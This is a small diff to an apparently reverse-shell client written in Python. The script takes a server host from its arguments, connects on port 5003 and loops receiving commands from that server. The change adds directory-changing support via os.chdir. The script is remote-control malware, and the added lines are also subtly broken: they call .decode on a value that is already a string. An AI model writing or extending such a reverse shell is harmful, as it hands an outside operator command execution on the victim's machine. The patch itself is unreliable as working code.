@@ -1,6 +1,7 @@
 import socket
 import subprocess
 import sys
+import os
 
 SERVER_HOST = sys.argv[1]
 SERVER_PORT = 5003
@@ -18,6 +19,9 @@ print("Server:", message)
 while True:
     # receive the command from the server
     command = s.recv(BUFFER_SIZE).decode()
+    if command[:2].decode("utf-8") == 'cd':
+        os.chdir(command[3:].decode("utf-8"))
+    
     if command.lower() == "exit":
         # if the command is exit, just break out of the loop
         break
